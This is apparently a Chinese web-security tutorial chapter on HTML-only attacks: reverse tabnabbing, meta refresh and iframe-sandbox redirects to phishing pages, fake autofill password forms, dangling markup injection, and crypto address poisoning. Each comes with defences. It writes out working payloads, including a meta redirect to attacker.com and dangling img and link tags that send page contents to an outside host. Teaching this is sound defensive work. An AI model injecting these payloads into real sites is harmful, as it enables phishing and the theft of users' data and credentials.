---
sidebar_position: 19
---

# 就算只有 HTML 也能攻擊？

無論是用 HTML 來影響 JavaScript 的 DOM clobbering 也好，或是透過原型鏈污染來攻擊的 prototype pollution 也好，目標都是干擾現有的 JavaScript 程式碼，達成攻擊的目的。就算是 CSS injection 好了，也是需要能新增 style 才能攻擊，並不是每個情況都適用。

如果既沒有 JavaScript 也沒有 CSS 可以用，只剩下 HTML，還能攻擊嗎？

還真的可以。

不過這邊要特地說明一下所謂的「攻擊」指的不一定是 XSS，像是 CSS injection 偷資料也是一種攻擊，讓網路釣魚變得更容易也是一種攻擊。漏洞有很多種，通常會根據它的嚴重程度跟影響範圍等等去評估，想當然爾，只能利用 HTML 的攻擊方式雖然存在，但可能嚴重程度較低，這是很正常的。

儘管如此，還是很有趣吧？有些看似沒什麼的漏洞，串起來就變得很厲害，因此儘管影響力不高，還是很值得注意。

最後，這篇提到的有些攻擊手法已經被修掉了，只存在於較舊的瀏覽器或是歷史當中，像這種的我會特別說明。

## Reverse tabnabbing

這一段程式碼有什麼問題？

``` html
<a href="https://blog.huli.tw" target="_blank">My blog</a>
```

不就是個超連結嗎？能有什麼問題？

雖然說現在確實沒什麼問題，但是在大約 2021 年以前，是有一點小問題的。

當你點擊這個連結去到我的部落格以後，等於是新開了一個視窗，而在我的部落格頁面就可以用 `window.opener` 存取到原來的頁面，雖然說因為 origin 不同所以沒辦法讀取資料，但可以用 `window.opener.location = 'http://example.com'` 把原本的頁面重新導向。

這樣能造成什麼影響呢？

舉一個實際的例子，假設現在你在逛 Facebook，看到我的貼文裡面有個文章的連結就點下去，文章看一看之後切回 Facebook 的分頁，發現畫面上說你已經被強制登出，請重新登入，你會怎麼做？

我相信應該有一部分的人會重新登入，因為看起來很正常嘛，但實際上這個登入頁面已經是釣魚網站了，是文章頁面用 `window.opener.location` 跳轉的，而不是原本的 Facebook。雖然說使用者看網址列一定可以看得出來不是 Facebook，但重點在於使用者根本不會預期點了文章以後，原本的網頁會被跳去其他地方。

像這種攻擊方式就叫做 reverse tabnabbing，透過新開的頁面去改變原本 tab 的網址。

如果你是前端的開發者而且有裝 ESLint，應該都有看過一個規則是超連結必須加上 `rel="noreferrer noopener"`，就是為了切開新頁面與原本頁面的連結，讓新的頁面沒有 `opener`，就可以阻止這種攻擊。

而當初這個特性被[揭露](https://mathiasbynens.github.io/rel-noopener/)之後引起了許多討論，滿多人都很訝異有這個行為的存在，當初的討論可以參考：[Windows opened via a target=_blank should not have an opener by default #4078](https://github.com/whatwg/html/issues/4078)，一直到 2019 年，spec 才在這個 PR 中更改了預設的行為，讓 `target=_blank` 預設就有 `noopener` 的效果：[Make target=_blank imply noopener; support opener #4330](https://github.com/whatwg/html/pull/4330)。

而 [Safari](https://trac.webkit.org/changeset/237144/webkit/) 跟 [Firefox](https://bugzilla.mozilla.org/show_bug.cgi?id=1522083) 都陸續跟進，Chromium 雖然晚了一些，不過最後也在 2020 年底跟上：[Issue 898942: Anchor target=_blank should imply rel=noopener](https://bugs.chromium.org/p/chromium/issues/detail?id=898942)。

所以在 2023 年的當下，如果你用的是最新版的瀏覽器，就已經不會有這個問題了。點開新的超連結以後並不會讓新的頁面拿到 `opener`，因此舊的頁面也不會被導到奇怪的地方。

## 透過 meta 標籤重新導向

「meta」這個字的其中一個意思是「自己」，例如說 data 是資料，而 metadata 是「描述資料的資料」，在網頁中的 meta 標籤也是同個意思，是用來描述網頁用的。

最常見的 meta 標籤就屬以下這幾個了：

``` html
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="這篇文章裡面會講到只透過 HTML 的攻擊方式">
<meta property="og:type" content="website">
<meta property="og:title" content="就算只有 HTML 也能攻擊？">
<meta property="og:locale" content="zh_TW">
```

可以透過它來指定頁面的編碼、viewport 的屬性以及這個網頁的敘述跟 Open Graph 的標題等等，這都是 meta 標籤在做的事情。

除了這些，還有一個攻擊者最感興趣的屬性：`http-equiv`。其實之前我在示範 CSP 的時候就用過這個屬性了。除了 CSP 以外，還可以用來做網頁的跳轉：

``` html
<meta http-equiv="refresh" content="3;url=https://example.com" />
```

上面的 HTML 會讓網頁在三秒後跳到 https://example.com ，因此這個標籤也常常拿來做純 HTML 的自動重新整理，只要跳轉的網頁是自己就好。

既然可以跳轉，那攻擊者就可以利用 `<meta http-equiv="refresh" content="0;url=https://attacker.com" />` 標籤將使用者跳轉到自己的頁面去。

使用的情境跟剛剛講的 reverse tabnabbing 是類似的，差別在於使用者不需要點任何的東西。舉例來說，假設今天有個電商網站的產品頁面有留言功能，而且允許 HTML，我就可以在底下留言，內容就是上面講的 `<meta>` 標籤。

當其他人點進這個產品時，就會被重新導向到我精心製作的釣魚頁面，很有可能一個不小心就誤以為是真的，就在釣魚頁面上下單輸入了信用卡號。

防禦方式的話就是過濾掉使用者輸入中的 meta 標籤，就可以防止這種攻擊。

## 透過 iframe 的攻擊

`<iframe>` 標籤可以把別人的網站嵌入在自己的網站中，最常見的範例就是部落格的留言系統或是 YouTube 影片等等，在 YouTube 影片按下分享時，可以直接複製含有 iframe 的 HTML：

``` html
<iframe width="560" height="315" src="https://www.youtube.com/embed/6WZ67f9M3RE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
```

當網站中可以讓使用者自行插入 iframe 時，就可能會導致一些問題。例如說可以插入一個釣魚的頁面：

![](pics/19-01.png)

這只是隨便做的範例，如果更有心的話可以調整 CSS，弄成跟整個網站的樣式一致，可信度就更高。一個不小心的話就可能誤以為 iframe 中的內容是原本網站的一部分。

除此之外，iframe 其實可以部分操控外面的網站。

跟 reverse tabnabbing 類似，當一個網站可以存取到其他頁面的 `window` 的時候，基本上就能用 `window.location = '...'` 把這個視窗導到其他頁面。

以 iframe 來說的話，可以這樣做：

```
// top 指的是最上層的視窗
top.location = 'https://example.com'
```

但其實這樣的行為是會被瀏覽器擋下來的，會出現以下的錯誤訊息：

> Unsafe attempt to initiate navigation for frame with origin ‘https://attacker.com/‘ from frame with URL ‘https://example.com/‘. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See https://www.chromestatus.com/features/5851021045661696.

就如同錯誤訊息所說的，因為這兩個 window 不是 same-origin，所以會被擋下來。但其實是有方法可以繞過的，只要把 iframe 改成這樣即可：

``` html
<iframe src="https://attacker.com/" sandbox="allow-scripts allow-top-navigation"></iframe>
```

當 iframe 有 `sandbox` 這個屬性時，就進入了沙箱模式，有許多功能都自動會被停用，需要特別開啟才能使用，可以開啟的功能如下：

1. allow-downloads
2. allow-forms
3. allow-modals
4. allow-orientation-lock
5. allow-pointer-lock
6. allow-popups
7. allow-popups-to-escape-sandbox
8. allow-presentation
9. allow-same-origin
10. allow-scripts
11. allow-top-navigation
12. allow-top-navigation-by-user-activation
13. allow-top-navigation-to-custom-protocols

而我們開啟的 `allow-scripts` 代表 iframe 中的頁面可以執行 JavaScript，`allow-top-navigation` 代表可以對最上層的頁面做重新導向。

最終可以達成的效果就跟剛剛的 meta 一樣，能夠把網站重新導向到釣魚網頁，增加釣魚成功的機率。

這個漏洞在 [codimd](https://github.com/hackmdio/codimd/issues/1263) 以及 [GitLab](https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a) 都有出現過，後者為此漏洞提供了 1000 美金的獎金，折合台幣約 3 萬塊。

至於防禦的話，如果網站本來就不該出現 iframe，記得把 iframe 濾掉，如果一定要使用的話，也記得不要讓使用者自己指定 sandbox 屬性。

想知道更多實際案例跟 iframe 的介紹可以參考：[防止 XSS 可能比想像中困難](https://blog.huli.tw/2021/05/25/prevent-xss-is-not-that-easy/) 以及 [iframe 與 window.open 黑魔法](https://blog.huli.tw/2022/04/07/iframe-and-window-open/)

## 透過表單也能攻擊？

如果網站可以讓使用者插入表單 `<form>` 相關的元素，會怎麼樣呢？

其實就跟上面講的 iframe 案例很像，你可以自己做出一個假的 form 表單，搭配其他文字跟使用者說你已經被登出，需要重新登入等等，如果使用者填了帳號密碼並按下確定，就會將帳號跟密碼傳送到攻擊者那邊。

但是表單的強大之處可不只這樣，直接來看一個實際的案例。

2022 年有一名資安研究員 Gareth Heyes 找到了 infosec Mastodon 的漏洞，可以在推文裡插入 HTML，但由於 CSP 很嚴格的緣故，不能插入 style 也不能執行 JavaScript。

在這樣艱困的環境底下，他利用了 form 搭配 Chrome 的自動填入機制來攻擊。現在很多瀏覽器都有自動記憶密碼的功能，並且會自動填入，而你自己做的假表單當然也不例外，也會被自動填入已經記憶好的帳號跟密碼。

而瀏覽器也很聰明，帳號跟密碼的 input 如果故意藏起來，就不會自動填入。但似乎還不夠聰明，因為只要把透明度設為 0 就可以繞過這個限制。

但問題是要怎麼讓使用者點擊按鈕送出表單呢？

雖然不能使用 style，但可以用 class 啊！可以利用頁面上現有的 class 來裝飾假表單，做成跟原本介面很像的樣子，這樣就能看起來更無害，更能夠吸引到使用者的注意跟點擊，透明度的部分也是同樣道理，可以利用現有的 class。

最後做出來的成果長這樣：

![](pics/19-02.png)

只要按下框框中的按鈕，就會自動送出含有帳號密碼的表單，也就是說，只要使用者點了看起來很正常的 icon，帳號就會被盜！

其他細節都在原始文章：[Stealing passwords from infosec Mastodon - without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)

## Dangling Markup injection

除了上面提到的這些，還有另一種攻擊方式叫做 dangling markup，直接看個範例比較好懂：

``` php
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'none'; style-src 'none'; form-action 'none'; frame-src 'none';">

</head>
<body>
  <div>
  Hello, <?php echo $_GET['q']; ?>
  <div>
    Your account balance is: 1337
  </div>
  <footer><img src="footer.png"></footer>
</div>
</body>
</html>
```

在這個案例中，我們可以藉由 query string 在頁面上植入 HTML，但問題是 CSP 是相當嚴格的，不能用 JavaScript，連 CSS 跟 iframe 也都不行，這時候用什麼方式可以偷到頁面上的資料呢？

我們可以傳入：`<img src="http://example.com?q=`，重點是這個 `<img>` 標籤沒有閉合，屬性也沒有用雙引號包起來，結合原本的 HTML 之後就會變成：

``` html
<div>
  Hello, <img src="http://example.com?q=
  <div>
    Your account balance is: 1337
  </div>
  <footer><img src="footer.png"></footer>
</div>
</body>
</html>
```

原本頁面上的文字 `<div>Your account balance...` 變成了 `src` 的一部分，一直到碰到另外一個 `"` 才會閉合屬性，再碰到 `>` 才會閉合標籤。換句話說，透過一個故意沒有關閉的標籤，我們成功讓頁面的內容變成了網址的一部分，傳到我們的伺服器去，而這種攻擊方式就叫做 dangling markup injection。

這種攻擊的使用時機就是 CSP 很嚴格而你又想偷取頁面上的資料的時候，就可以試試看這種攻擊手法。但要注意的是 Chrome 有內建[防禦機制](https://chromestatus.com/feature/5735596811091968)，只要是 src 或是 href 裡面有 `<` 或是換行，就不會載入網址。

因此如果拿上面的 HTML 去 Chrome 跑，會看到請求被 block 了。不過 Firefox 目前就沒有相關的機制，會很開心地幫你送出請求。

但如果你的注入點剛好是在 `<head>` 裡面，也可以用 `<link>` 繞過 Chrome 的限制：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'none'; style-src 'none'; form-action 'none'; frame-src 'none';">
  <link rel=icon href="http://localhost:5555?q=
</head>
<body>
  <div>
  Hello, 
  <div>
    Your account balance is: 1337
  </div>
  <footer><img src="footer.png"></footer>
</div>
</body>
</html>
```

會收到的 request 是：

```
GET /?q=%3C/head%3E%3Cbody%3E%20%20%3Cdiv%3E%20%20Hello,%20%20%20%3Cdiv%3E%20%20%20%20Your%20account%20balance%20is:%201337%20%20%3C/div%3E%20%20%3Cfooter%3E%3Cimg%20src= HTTP/1.1
```

URL decode 之後就會看到原本的 HTML，順利把資料偷出來。

## 小結

比起之前提過的那些攻擊手法，單純只利用 HTML 來攻擊的門檻顯然更高，使用者可能需要先點擊連結或是按鈕，還需要搭配精心製作的釣魚網站等等，才能達成目的，偷取到有價值的資料。

但儘管如此，不得不承認這些手段還是有影響力的，而且千萬不要小看這種針對使用者習慣的攻擊。

舉個例子，在加密貨幣的世界中，你可以用其他人的身份轉 0 元給別人。例如說小明可以幫小華轉 0 元給小美，小美也可以幫小明轉 0 元給小華，只要金額是 0 元，你想怎麼轉就怎麼轉，而手續費是發起這個操作的人要付的。

按照常理來想，雖然可以幫其他人轉帳是件很奇怪的事情，但是誰會做這種事？小華跟小美的餘額都不會變，而小明自己虧了手續費 100 塊，他幹嘛這樣做？

可是一旦搭配了使用者平常轉帳的習慣，就變成了很有趣的攻擊手法。

區塊鏈上的帳號（地址）都是很長一串，像這樣：`0xa7B4BAC8f0f9692e56750aEFB5f6cB5516E90570`

所以在介面上顯示的時候，因為長度的關係可能只會顯示 `0xa7B.....0570`這樣前後幾碼而已，中間都用 ... 來代替。雖然說地址都是隨機產生的，要產生相同的地址幾乎是不可能，但如果只是前面跟後面幾位數相同的話，只要多花一些時間就可以產出來。

舉例來說，我可以產出這個地址：`0xa7Bf48749D2E4aA29e3209879956b9bAa9E90570`

有沒有注意到前後幾位數都一樣？因此這個地址在介面上顯示時，也會顯示 `0xa7B....0570`，跟前面的地址是一模一樣的。

而很多使用者在轉帳時，如果要轉的地址之前很常轉，那就習慣會去交易紀錄直接複製舊的交易的地址，因為方便又快嘛，而且我錢包都是自己在用的，怎麼可能有別人的交易紀錄？

假設 A 在使用的交易所的錢包地址就是上面的 `0xa7B4BAC8f0f9692e56750aEFB5f6cB5516E90570`，介面顯示是 `0xa7B....0570`，我就刻意做一個前後都一樣的錢包地址，並且用剛剛提到的 0 元轉帳，用 A 的帳號轉到這個假地址。

搭配上剛剛提到的使用者習慣，A 只要從交易紀錄複製貼上，就會複製到我創造的假地址，並且把錢轉到這個假錢包。

而實際上有這種習慣的人還真不少，甚至連全世界最大的加密貨幣交易幣安也在 2023 年 8 月時因為這個攻擊被騙走了 6 億台幣。

從這個案例中，我們可以看到有些單獨來看沒什麼影響力的小問題，搭配其他利用方式之後就會變得威力無窮。

第三章「不直接執行 JavaScript 的攻擊手法」就到這裡結束，下一章是「跨越限制攻擊其他網站」，會探討瀏覽器對網頁之間的交流到底有什麼樣的安全限制，以及我們該如何繞過它。
